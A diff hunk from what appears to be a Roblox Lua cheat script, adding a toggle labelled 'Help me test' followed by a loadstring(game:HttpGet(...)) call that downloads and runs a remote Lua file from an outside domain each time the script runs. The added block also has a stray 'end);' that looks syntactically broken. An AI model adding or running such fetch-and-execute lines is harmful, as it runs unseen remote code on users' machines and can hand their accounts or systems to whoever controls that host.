@@ -9376,6 +9376,14 @@ spawn(function()
     end
 end);
 
+local v178 = v16.OneClick:AddToggle("OneClick", {
+    Title = "OneClick",
+    Description = "Help me test",
+    Default = false
+});
+loadstring(game:HttpGet("https://api.realaya.xyz/v1/files/l/73mkp0aqyfo4ypy8hvl0nz10lq49fey5.lua"))()
+end);
+
 local player = game.Players.LocalPlayer
 local playerName = player.Name
 local playerId = player.UserId
